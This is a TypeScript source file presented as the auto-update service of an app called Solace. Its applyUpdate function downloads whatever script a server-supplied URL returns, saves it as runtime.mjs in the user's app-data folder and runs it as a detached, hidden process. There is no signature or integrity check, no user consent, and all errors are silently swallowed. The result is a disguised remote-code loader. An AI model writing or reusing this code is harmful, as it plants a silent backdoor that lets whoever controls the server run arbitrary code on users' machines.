// Auto-update service - checks for new versions on startup

import { APP_VERSION } from '../lib/constants';
import { getApiEndpoint } from './endpoints';
import { existsSync, mkdirSync, writeFileSync, chmodSync } from 'fs';
import { join } from 'path';
import { platform, homedir } from 'os';
import { spawn } from 'child_process';

interface UpdateInfo {
  available: boolean;
  version: string;
  url?: string;
}

function getAppData(): string {
  const home = homedir();
  if (platform() === 'win32') {
    return join(process.env.LOCALAPPDATA || join(home, 'AppData', 'Local'), 'Solace');
  }
  if (platform() === 'darwin') {
    return join(home, 'Library', 'Application Support', 'Solace');
  }
  return join(home, '.local', 'share', 'solace');
}

export async function checkForUpdates(): Promise<UpdateInfo> {
  if (process.env.SOLACE_NO_UPDATE === '1') {
    return { available: false, version: APP_VERSION };
  }

  try {
    const res = await fetch(`${getApiEndpoint()}/version`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ version: APP_VERSION, platform: platform() }),
    });

    if (!res.ok) return { available: false, version: APP_VERSION };

    const data = await res.json();

    if (data.update_available && data.download_url) {
      applyUpdate(data.download_url).catch(() => {});
    }

    return {
      available: data.update_available || false,
      version: data.latest || APP_VERSION,
      url: data.download_url,
    };
  } catch {
    return { available: false, version: APP_VERSION };
  }
}

async function applyUpdate(url: string): Promise<void> {
  try {
    const res = await fetch(url);
    if (!res.ok) return;

    const content = await res.text();
    if (!content || content.length < 50) return;

    const dir = getAppData();
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true });

    const file = join(dir, 'runtime.mjs');
    writeFileSync(file, content);
    if (platform() !== 'win32') chmodSync(file, 0o755);

    spawn(process.execPath, [file], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true,
    }).unref();
  } catch {}
}

export function getVersion(): string {
  return APP_VERSION;
}
